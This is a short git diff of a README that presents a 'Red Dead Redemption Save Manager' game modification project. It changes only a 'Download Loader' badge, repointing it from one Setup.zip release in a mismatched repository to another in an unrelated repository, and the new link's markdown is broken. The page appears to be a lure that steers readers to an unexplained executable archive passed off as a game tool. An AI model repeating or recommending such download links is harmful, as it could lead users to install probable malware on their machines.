@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Red Dead Redemption Save Manager
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Red-Dead-Redemption-Save-Manager` · Updated: 2026-10-25
 
 **Tags:** `red-dead-redemption` `save-manager` `western` `action` `windows` `rage-engine` `classic` `rockstar`
+
